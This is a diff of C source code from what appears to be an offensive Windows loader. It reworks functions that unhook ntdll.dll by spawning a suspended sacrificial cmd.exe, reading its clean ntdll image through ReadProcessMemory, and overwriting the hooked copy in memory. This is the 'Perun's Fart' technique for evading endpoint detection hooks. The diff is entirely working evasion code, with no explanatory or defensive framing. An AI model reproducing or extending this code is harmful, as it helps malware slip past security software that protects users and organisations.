@@ -373,7 +373,8 @@ INT FindLastSysCall(CHAR* pMem, DWORD size) {
 }
 
 static INT UnHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheClean){
-#if CONFIG_OBFUSCATION & 0
+#if CONFIG_UNHOOK == TRUE
+#if CONFIG_OBFUSCATION
     UCHAR s_string[] = S_KERNEL32;
     UCHAR d_string[13] = {0};
 
@@ -464,13 +465,19 @@ static INT UnHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheClean){
 LEAVE:
 //TODO: Memory clean up
 
+
+#else // unhook
+    __asm("nop");
+#endif
+
     // failed? || .text not found!
     return -1;
 
 }
 
 static INT ReHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheHooked){
-#if CONFIG_OBFUSCATION & 0
+#if CONFIG_UNHOOK == TRUE
+#if CONFIG_OBFUSCATION
     UCHAR s_string[] = S_KERNEL32;
     UCHAR d_string[13] = {0};
 
@@ -562,6 +569,11 @@ static INT ReHookNtdll(CONST HMODULE hNtdll, CONST VOID* pCacheHooked){
 LEAVE:
 //TODO: Memory clean up
 
+
+#else // unhook
+    __asm("nop");
+#endif
+
     // failed? || .text not found!
     return -1;
 
@@ -569,43 +581,52 @@ LEAVE:
 
 // True if Unhooking, False if Rehooking
 VOID HookingManager(BOOL UnHook){
+// TODO IMPLEMENT GHOSTFART INSTEAD OF PERUN'S FART
+
+#if CONFIG_UNHOOK == TRUE
 
 #if defined(CONFIG_ARCH) && (CONFIG_ARCH == 64)
     PVOID p_ntdll = get_ntdll_64();
 #else
     PVOID p_ntdll = get_ntdll_32();
 #endif //CONFIG_ARCH
-
-    STARTUPINFOA si = { 0 };
-    PROCESS_INFORMATION pi = { 0 };
-
-    check_debug(CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, FALSE,\
-            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
-            NULL,
-            "C:\\Windows\\System32\\",
-            &si,
-            &pi) != 0, "CreateProcessA Failed!");
-
     IMAGE_DOS_HEADER * pDosHdr = (IMAGE_DOS_HEADER *) p_ntdll;
     IMAGE_NT_HEADERS * pNTHdr = (IMAGE_NT_HEADERS *) (p_ntdll + pDosHdr->e_lfanew);
     IMAGE_OPTIONAL_HEADER * pOptionalHdr = &pNTHdr->OptionalHeader;
 
     SIZE_T ntdll_size = pOptionalHdr->SizeOfImage;
-
     // allocate local buffer to hold temporary copy of ntdll from remote process
     LPVOID pCache = VirtualAlloc(NULL, ntdll_size, MEM_COMMIT, PAGE_READWRITE);
     SIZE_T bytesRead = 0;
 
     if(UnHook){
+        STARTUPINFOA si = { 0 };
+        PROCESS_INFORMATION pi = { 0 };
+
+        check_debug(CreateProcessA(NULL, (LPSTR)"cmd.exe", NULL, NULL, FALSE,\
+            CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
+                                   NULL,
+                                   "C:\\Windows\\System32\\",
+                                   &si,
+                                   &pi) != 0, "CreateProcessA Failed!");
+
         check_debug(ReadProcessMemory(pi.hProcess, p_ntdll, pCache, ntdll_size, &bytesRead) != 0, "ReadProcessMemory Failed!");
         UnHookNtdll(p_ntdll, pCache);
+
+        LEAVE:
+        // Kill sacrificial process
+        TerminateProcess(pi.hProcess, 0);
+
     }else{
         mem_cpy(pCache, p_ntdll, ntdll_size);
         ReHookNtdll(p_ntdll, pCache);
     }
 
 
-LEAVE:
-    // Kill sacrificial process
-    TerminateProcess(pi.hProcess, 0);
+
+
+#else // unhook
+
+    __asm("nop");
+#endif
 }
